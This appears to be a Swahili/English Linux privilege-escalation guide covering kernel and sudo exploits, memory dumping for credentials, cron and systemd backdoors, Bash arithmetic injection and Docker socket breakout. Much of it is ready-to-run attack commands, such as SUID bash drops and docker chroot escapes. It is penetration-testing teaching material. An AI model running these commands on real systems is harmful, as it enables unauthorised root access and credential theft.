# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Tuanze kupata maarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Kama una **ruhusa za kuandika kwenye folda yoyote ndani ya `PATH`** unaweza hijack baadhi ya maktaba au binaries:
```bash
echo $PATH
```
### Env info

Je, kuna taarifa za kuvutia, nywila au funguo za API katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia toleo la kernel na kama kuna exploit ambalo linaweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zilizo hatarini na baadhi ya tayari **compiled exploits** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya kernel zilizo hatarini kutoka kwenye tovuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vifaa vinavyoweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (run kwenye victim, huchunguza tu exploits za kernel 2.x)

Daima **tafuta kernel version kwenye Google**, huenda kernel version yako imeandikwa katika kernel exploit fulani na basi utakuwa na uhakika kwamba exploit hii ni halali.

Mbinu za ziada za kernel exploitation:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia ikiwa toleo la sudo lina udhaifu ukitumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinawawezesha watumiaji wa ndani wasiokuwa na ruhusa kuinua vibali vyao hadi root kupitia chaguo la sudo `--chroot` wakati faili `/etc/nsswitch.conf` inatumiwa kutoka kwenye saraka inayoendeshwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` linalo vulnerable na linaunga mkono kipengele cha `chroot`.

Kwa maelezo zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: Ukaguzi wa saini umefeli

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumika.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha kinga zinazowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:

{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **what is mounted and unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime-**unmounted** unaweza kujaribu ku-**mount** na kukagua taarifa binafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit fulani kwani inapendekezwa kucompile kwenye kompyuta utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zimewekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza exploited kwa ajili ya escalating privileges…\
Inashauriwa kukagua kwa mikono toleo la software zilizowekwa zinazoshukiwa zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kukagua software zilizozeeka na zilizo na udhaifu zilizowekwa ndani ya mashine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa kiasi kikubwa hazitakuwa na manufaa, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au zinazofanana zitakazokagua kama toleo lolote la software lililosakinishwa lina udhaifu dhidi ya exploits_

## Processes

Angalia **ni michakato gani** yanaendeshwa na angalia kama mchakato yeyote una **more privileges kuliko inavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** hutambua hayo kwa kukagua parameter ya `--inspect` ndani ya mstari wa amri wa process.\
Pia **check your privileges over the processes binaries**, labda unaweza kuandika juu ya mtu mwingine.

### Ufuatiliaji wa michakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia processes. Hii inaweza kuwa muhimu sana kubaini vulnerable processes zinazotekelezwa mara kwa mara au wakati seti ya mahitaji zinatimizwa.

### Kumbukumbu ya mchakato

Baadhi ya huduma za server huhifadhi **credentials in clear text inside the memory**.\
Kawaida utahitaji **root privileges** kusoma memory ya processes zinazomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni zaidi ya msaada wakati tayari wewe ni root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma memory ya processes unazomiliki**.

> [!WARNING]
> Kumbuka kwamba sasa hivi mashine nyingi **haziruhusu ptrace by default**, ambayo ina maana huwezi dump processes nyingine zinazomilikiwa na mtumiaji usio na ruhusa.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: processes zote zinaweza kudebugiwa, mradi tu zina uid sawa. Huu ndio mtindo wa zamani wa jinsi ptracing ilivyofanya kazi.
> - **kernel.yama.ptrace_scope = 1**: mchakato mzazi pekee ndiye anaweza kudebugiwa.
> - **kernel.yama.ptrace_scope = 2**: Ni admin pekee anayeweza kutumia ptrace, kwani inahitaji capability ya CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: Hakuna mchakato unaoweza kutazamwa kwa ptrace. Mara baada ya kuwekwa, inahitaji reboot ili kuruhusu ptracing tena.

#### GDB

Ikiwa una ufikiaji wa memory ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani yake credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa process ID fulani, **maps zinaonyesha jinsi memory ilivyopangwa ndani ya** virtual address space ya process hiyo; pia zinaonyesha **uruhusa za kila eneo lililopangwa**. Kifaili bandia **mem** **kinafunua memory ya process yenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **eneo gani za memory zinazoweza kusomwa** na offsets zao. Tunatumia taarifa hii ili **kutafuta ndani ya faili mem na ku-dump maeneo yote yanayosomwa** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` inatoa ufikiaji kwa kumbukumbu ya **kimwili** ya mfumo, sio kumbukumbu ya virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inasomwa tu na **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni utekelezaji wa Linux wa zana ya ProcDump ya jadi kutoka kwenye mkusanyiko wa zana za Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili kufanya dump ya kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kwa mikono kuondoa mahitaji ya root na dump mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Vyeti kutoka kwenye kumbukumbu ya mchakato

#### Mfano wa kutumia kwa mikono

Iwapo utagundua kuwa mchakato wa authenticator unaendesha:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump mchakato (tazama sehemu zilizotangulia kupata njia tofauti za dump kumbukumbu ya mchakato) na kutafuta credentials ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Zana [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) itaiba **clear text credentials from memory** na kutoka kwa baadhi ya **well known files**. Inahitaji vibali vya root ili ifanye kazi ipasavyo.

| Kipengele                                           | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi zilizopangwa / Cron jobs

### Crontab UI (alseambusher) inapoendeshwa kama root – web-based scheduler privesc

Ikiwa paneli ya wavuti "Crontab UI" (alseambusher/crontab-ui) inaendeshwa kama root na imefungwa kwa loopback tu, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda kazi yenye vigezo vya juu ili kufanya privesc.

Mnyororo wa kawaida
- Gundua port inayopangwa kwa loopback tu (mfano, 127.0.0.1:8000) na Basic-Auth realm kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika artifacts za uendeshaji:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayoonyesha `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Tengeneza high-priv job na uendeshe mara moja (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha usalama
- Usiruhusu Crontab UI kuendesha kama root; itumie mtumiaji maalum na idhini ndogo
- Shikilia kwa localhost na pia punguza ufikaji kwa firewall/VPN; usitumie tena nywila
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa utekelezaji wa kazi zinazoitwa on-demand

Angalia kama kazi yoyote iliyopangwa ina udhaifu. Labda unaweza kunufaika na script inayotekelezwa na root (wildcard vuln? unaweza kubadilisha files ambazo root anazitumia? tumia symlinks? unda specific files katika directory ambayo root anaitumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata root shell kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ikiwa script inayotekelezwa na root ina “**\***” ndani ya amri, unaweza kuitumia kusababisha mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya path kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio hatari).**

Soma ukurasa ufuatao kwa tricks zaidi za wildcard exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa cron/parser inayotekelezwa na root inasoma uwanja za log zisizoaminika na kuziweka katika arithmetic context, attacker anaweza kuingiza command substitution $(...) itakayotekelezwa kama root wakati cron inapoendesha.

- Why it works: Katika Bash, expansions zinafanyika kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Kwa hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` inabadilishwa kwanza (kukifanya amri itekelezwe), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic hivyo script inaendelea bila makosa.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Pata attacker-controlled text iandikwe kwenye log inayochunguzwa ili uwanja unaoonekana nambari uwe na command substitution na umalizike kwa digit. Hakikisha amri yako haichapishi kwenye stdout (au uirekebishe kwa redirect) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Kama unaweza **modify a cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Iwapo script inayotekelezwa na root inatumia **directory where you have full access**, inaweza kuwa muhimu kufuta folda hiyo na **create a symlink folder to another one** inayohudumia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron jobs za mara kwa mara

Unaweza monitor processes kutafuta zile zinazotekelezwa kila 1, 2 au 5 dakika. Labda unaweza kuzitumia kwa faida na escalate privileges.

Kwa mfano, ili **monitor every 0.1s during 1 minute**, **sort by less executed commands** na kufuta commands ambazo zimeendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila mchakato unaoanza).

### Cron jobs zisizoonekana

Inawezekana kuunda cronjob kwa **kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (kumbuka carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili i **tekeleze** backdoor yako **wakati** service inapo **anzishwa**, **inapoanzishwa upya** au **inaposimamishwa** (labda utahitaji kusubiri hadi mashine itakapowashwa upya).\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Service binaries zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **ruhusa za kuandika juu ya binaries zinazotekelezwa na services**, unaweza kuzibadilisha ili kuweka backdoor, hivyo pale services zitakapotekelezwa tena backdoor zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumika na **systemd** na:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **kuandika** katika yoyote ya folda za njia hiyo huenda ukaweza **kupandisha ruhusa**. Unahitaji kutafuta **relative paths zinazotumika kwenye faili za usanidi za huduma** kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na the relative path binary** ndani ya systemd PATH folder ambayo unaweza kuandika, na wakati service itaombwa kutekeleza kitendo chenye udhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itaendeshwa (watumiaji wasiokuwa na ruhusa kawaida hawawezi kuanza/kuacha services lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni systemd unit files ambazo majina yao yanaisha kwa `**.timer**` zinazodhibiti faili za `**.service**` au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengewa ndani kwa matukio ya kalenda na matukio ya monotonic time na zinaweza kuendeshwa kwa njia isiyosubiri.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Writable timers

Ikiwa unaweza kubadilisha timer, unaweza kuifanya itekeleze baadhi ya systemd.unit zilizopo (kama `.service` au `.target`).
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Kwa hiyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta kitengo cha systemd (kama `.service`) ambacho kina **kinatekeleza binary inayoweza kuandikwa**
- Tafuta kitengo cha systemd kinachotekeleza relative path na una **uruhusa za kuandika** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inawashwa kwa kuunda symlink kwa `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinaruhusu **mawasiliano ya mchakato** kwenye mashine ile ile au tofauti ndani ya modeli za client-server. Zinatumia mafaili ya descriptor ya Unix kwa mawasiliano kati ya kompyuta na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini kwa muhtasari zinatumika **kuonyesha mahali itakosikiliza** socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port kusikiliza, n.k.)
- `Accept`: Inapokea argument ya boolean. Ikiwa **true**, **service instance inazalishwa kwa kila muunganisho unaokuja** na socket ya muunganisho pekee ndiyo hupitishwa kwake. Ikiwa **false**, sockets zote zinazokaa kusikiliza zenyewe zina **pitishwa kwa unit ya service iliyozinduliwa**, na unit moja tu ya service inazalishwa kwa muunganisho wote. Thamani hii haizingatiwi kwa datagram sockets na FIFOs ambapo unit moja ya service inashughulikia bila masharti trafiki yote inayokuja. Kwa chaguo-msingi ni **false**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinachukua mstari mmoja au zaidi wa amri, ambazo zina **tekwa kabla** au **baada** ya **sockets**/FIFOs za kusikiliza kuundwa na kufungwa, mtawalia. Tokeni ya kwanza ya mstari wa amri lazima iwe jina la faili lenye njia kamili (absolute filename), ikifuatiwa na hoja kwa mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zina **tekwa kabla** au **baada** ya **sockets**/FIFOs za kusikiliza kufungwa na kuondolewa, mtawalia.
- `Service`: Inaeleza jina la unit ya **service** **kuanzishwa** wakati wa **incoming traffic**. Mipangilio hii inaruhusiwa tu kwa sockets zilizo na Accept=no. Kwa chaguo-msingi inatumia service yenye jina sawa na socket (kwa kubadilisha suffix). Katika most cases, haitakuwa lazima kutumia chaguo hiki.

### Writable .socket files

Ikiwa utapata faili `.socket` **inayoweza kuandikwa** unaweza **ongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itakavyoundwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine itakapozinduliwa upya.**\ _Kumbuka mfumo lazima utumie ule usanidi wa faili ya socket au backdoor haitatekelezwa_

### Writable sockets

Ikiwa **utambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na si juu ya faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na labda kutumia udhaifu.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kuwa kunaweza kuwa na baadhi ya **sockets zinazosikiliza HTTP** requests (_sio kuhusu .socket files bali faili zinazofanya kazi kama unix sockets_). Unaweza kukagua hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit some vulnerability**.

### Socket ya Docker inayoweza kuandikwa

Socket ya Docker, mara nyingi inapatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hili linavyoweza kufanywa na mbinu mbadala ikiwa Docker CLI haitapatikana.

#### **Privilege Escalation kwa Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container ikiwa na upatikanaji wa ngazi ya root kwa mfumo wa faili wa host.

#### **Using Docker API Directly**

Katika kesi ambapo Docker CLI haipatikani, Docker socket bado inaweza kushughulikiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container inayofanya mount directory ya root ya mfumo wa host.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container iliyoanzishwa hivi karibuni:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho kwa container, ukiruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kusanidi muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ikiwa na upatikanaji wa root kwa mfumo wa faili wa host.

### Others

